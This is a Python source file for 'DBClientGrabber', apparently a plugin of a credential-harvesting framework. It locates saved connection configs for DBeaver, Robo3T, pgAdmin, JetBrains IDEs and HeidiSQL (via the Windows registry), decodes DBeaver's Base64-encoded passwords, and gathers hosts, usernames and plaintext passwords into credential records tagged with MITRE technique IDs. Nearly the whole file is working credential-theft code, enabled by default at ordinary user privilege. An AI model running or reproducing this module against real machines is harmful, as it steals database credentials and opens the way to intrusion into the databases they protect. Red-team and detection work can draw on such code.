"""
DBClientGrabber -- Extract credentials from database management tools

DBA workstations are goldmines. Database client tools store connection
credentials in config files, often in plaintext or weakly encrypted.

Targets:
- DBeaver: credentials-config.json (Base64-encoded passwords)
- DataGrip/JetBrains: dataSourceStorage.xml
- SQL Developer: connections.xml
- HeidiSQL: Registry HKCU\\Software\\HeidiSQL\\Servers
- Robomongo/Robo3T: robo3t.json
- Azure Data Studio: settings.json
- pgAdmin: servers.json

MITRE ATT&CK: T1552.001 (Credentials In Files)
"""

from __future__ import annotations

import base64
import json
import os
import re
import xml.etree.ElementTree as ET

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text


class DBClientGrabber(GrabberModule):
    name = "db_client"
    description = "Extract credentials from DBeaver, DataGrip, SQL Developer, HeidiSQL, Robo3T"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    _TARGETS = [
        ("{appdata}/DBeaverData/workspace6/General/.dbeaver/credentials-config.json", "_parse_dbeaver"),
        ("{home}/.local/share/DBeaverData/workspace6/General/.dbeaver/credentials-config.json", "_parse_dbeaver"),
        ("{home}/.3T/robo-3t/*/robo3t.json", "_parse_robo3t"),
        ("{home}/.config/robo-3t/*/robo3t.json", "_parse_robo3t"),
        ("{appdata}/pgAdmin/pgadmin4/servers.json", "_parse_pgadmin"),
        ("{home}/.pgadmin/servers.json", "_parse_pgadmin"),
    ]

    # JetBrains product directories to search
    _JETBRAINS_PRODUCTS = [
        "DataGrip", "IntelliJIdea", "PyCharm", "WebStorm",
        "GoLand", "CLion", "Rider", "PhpStorm", "RubyMine",
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        for template, _ in self._TARGETS:
            path = self._expand(template, context)
            if path:
                import glob
                for match in glob.glob(path):
                    if os.path.isfile(match):
                        return True
        # Check JetBrains dirs
        jetbrains_base = os.path.join(context.appdata_roaming or "", "JetBrains")
        if os.path.isdir(jetbrains_base):
            return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        # Process known targets
        import glob
        for template, parser_name in self._TARGETS:
            pattern = self._expand(template, context)
            if not pattern:
                continue
            for path in glob.glob(pattern):
                if not os.path.isfile(path):
                    continue
                content = safe_read_text(path)
                if not content:
                    continue
                try:
                    parser = getattr(self, parser_name)
                    creds = parser(path, content)
                    result.credentials.extend(creds)
                    if creds:
                        result.findings.append(self.make_finding(
                            file_path=path,
                            description=f"Extracted {len(creds)} DB credential(s)",
                            score=125 * min(len(creds), 3),
                            matched_value=os.path.basename(path),
                        ))
                except Exception as e:
                    result.errors.append(f"{parser_name}: {e}")

        # JetBrains DataGrip/IDE data sources
        jetbrains_base = os.path.join(context.appdata_roaming or "", "JetBrains")
        if os.path.isdir(jetbrains_base):
            self._scan_jetbrains(jetbrains_base, result)

        # Linux JetBrains
        jetbrains_linux = os.path.join(context.user_profile_path, ".config", "JetBrains")
        if os.path.isdir(jetbrains_linux):
            self._scan_jetbrains(jetbrains_linux, result)

        # HeidiSQL (Windows registry)
        if context.is_windows:
            self._extract_heidisql(result)

        result.status = GrabberStatus.COMPLETED
        return result

    @staticmethod
    def _expand(template: str, context: GrabberContext) -> str:
        return template.format(
            appdata=context.appdata_roaming or "",
            localappdata=context.appdata_local or "",
            home=context.user_profile_path,
        )

    def _parse_dbeaver(self, path: str, content: str) -> list[ExtractedCredential]:
        """Parse DBeaver credentials-config.json (Base64-encoded passwords)."""
        creds = []
        try:
            data = json.loads(content)
            for conn_id, conn_data in data.items():
                if not isinstance(conn_data, dict):
                    continue
                username = conn_data.get("user", "") or conn_data.get("#connection.login", "")
                password_b64 = conn_data.get("password", "") or conn_data.get("#connection.password", "")

                password = ""
                if password_b64:
                    try:
                        password = base64.b64decode(password_b64).decode("utf-8", errors="ignore")
                    except Exception:
                        password = password_b64

                url = conn_data.get("url", "") or conn_data.get("host", "")

                if username or password:
                    creds.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type="password",
                        target_application="DBeaver",
                        url=url,
                        username=username,
                        decrypted_value=password,
                        notes=f"connection={conn_id}",
                        mitre_technique="T1552.001",
                        source_file=path,
                    ))
        except (json.JSONDecodeError, KeyError):
            pass
        return creds

    def _parse_robo3t(self, path: str, content: str) -> list[ExtractedCredential]:
        """Parse Robo3T/Robomongo connection JSON."""
        creds = []
        try:
            data = json.loads(content)
            connections = data.get("connections", [])
            for conn in connections:
                if not isinstance(conn, dict):
                    continue
                cred_data = conn.get("credentials", [{}])
                server = conn.get("serverHost", "") or conn.get("connectionName", "")
                port = conn.get("serverPort", "")
                if port:
                    server = f"{server}:{port}"

                for cred_item in (cred_data if isinstance(cred_data, list) else [cred_data]):
                    if not isinstance(cred_item, dict):
                        continue
                    username = cred_item.get("userName", "")
                    password = cred_item.get("userPassword", "")
                    db = cred_item.get("databaseName", "")

                    if username or password:
                        creds.append(ExtractedCredential(
                            source_module=self.name,
                            credential_type="password",
                            target_application="Robo3T",
                            url=server,
                            username=username,
                            decrypted_value=password,
                            notes=f"db={db}" if db else "",
                            mitre_technique="T1552.001",
                            source_file=path,
                        ))
        except (json.JSONDecodeError, KeyError):
            pass
        return creds

    def _parse_pgadmin(self, path: str, content: str) -> list[ExtractedCredential]:
        """Parse pgAdmin servers.json for PostgreSQL connections."""
        creds = []
        try:
            data = json.loads(content)
            servers = data.get("Servers", {})
            for server_id, server_data in servers.items():
                if not isinstance(server_data, dict):
                    continue
                host = server_data.get("Host", "")
                port = server_data.get("Port", 5432)
                username = server_data.get("Username", "")
                db = server_data.get("MaintenanceDB", "")

                if username:
                    creds.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type="password",
                        target_application="pgAdmin",
                        url=f"{host}:{port}",
                        username=username,
                        notes=f"db={db}; pgAdmin saves password separately in browser",
                        mitre_technique="T1552.001",
                        source_file=path,
                    ))
        except (json.JSONDecodeError, KeyError):
            pass
        return creds

    def _scan_jetbrains(self, base_dir: str, result: GrabberResult) -> None:
        """Scan JetBrains IDE config directories for data source credentials."""
        try:
            for product_dir in os.scandir(base_dir):
                if not product_dir.is_dir():
                    continue
                # Look for dataSources.xml or dataSourceStorage.xml
                for xml_name in ("options/dataSources.xml", "options/dataSourceStorage.xml"):
                    xml_path = os.path.join(product_dir.path, xml_name)
                    if not os.path.isfile(xml_path):
                        continue
                    content = safe_read_text(xml_path)
                    if not content:
                        continue
                    creds = self._parse_jetbrains_datasource(xml_path, content)
                    result.credentials.extend(creds)
                    if creds:
                        result.findings.append(self.make_finding(
                            file_path=xml_path,
                            description=f"JetBrains DB credentials: {len(creds)} connection(s)",
                            score=125 * min(len(creds), 3),
                            matched_value=product_dir.name,
                        ))
        except (PermissionError, OSError):
            pass

    def _parse_jetbrains_datasource(self, path: str, content: str) -> list[ExtractedCredential]:
        """Parse JetBrains dataSourceStorage.xml for DB credentials."""
        creds = []
        try:
            root = ET.fromstring(content)
            for ds in root.iter("data-source"):
                name = ds.attrib.get("name", "")
                url_elem = ds.find(".//jdbc-url") or ds.find(".//url")
                user_elem = ds.find(".//user-name") or ds.find(".//user")

                url = url_elem.text if url_elem is not None and url_elem.text else ""
                username = user_elem.text if user_elem is not None and user_elem.text else ""

                if username or url:
                    creds.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type="password",
                        target_application=f"JetBrains ({name})",
                        url=url,
                        username=username,
                        notes="Password stored separately in JetBrains credential store",
                        mitre_technique="T1552.001",
                        source_file=path,
                    ))
        except ET.ParseError:
            pass
        return creds

    def _extract_heidisql(self, result: GrabberResult) -> None:
        """Extract HeidiSQL saved sessions from Windows Registry."""
        try:
            from ._registry import read_reg_value, enum_reg_subkeys
            import winreg

            servers_path = r"Software\HeidiSQL\Servers"
            try:
                sessions = enum_reg_subkeys(winreg.HKEY_CURRENT_USER, servers_path)
            except Exception:
                return

            for session_name in sessions:
                session_path = f"{servers_path}\\{session_name}"
                try:
                    host = read_reg_value(winreg.HKEY_CURRENT_USER, session_path, "Host") or ""
                    port = read_reg_value(winreg.HKEY_CURRENT_USER, session_path, "Port") or ""
                    user = read_reg_value(winreg.HKEY_CURRENT_USER, session_path, "User") or ""
                    password = read_reg_value(winreg.HKEY_CURRENT_USER, session_path, "Password") or ""

                    if user or password:
                        result.credentials.append(ExtractedCredential(
                            source_module=self.name,
                            credential_type="password",
                            target_application="HeidiSQL",
                            url=f"{host}:{port}" if port else host,
                            username=user,
                            decrypted_value=password,
                            notes=f"session={session_name}",
                            mitre_technique="T1552.002",
                        ))
                except Exception:
                    continue

        except (ImportError, Exception):
            pass
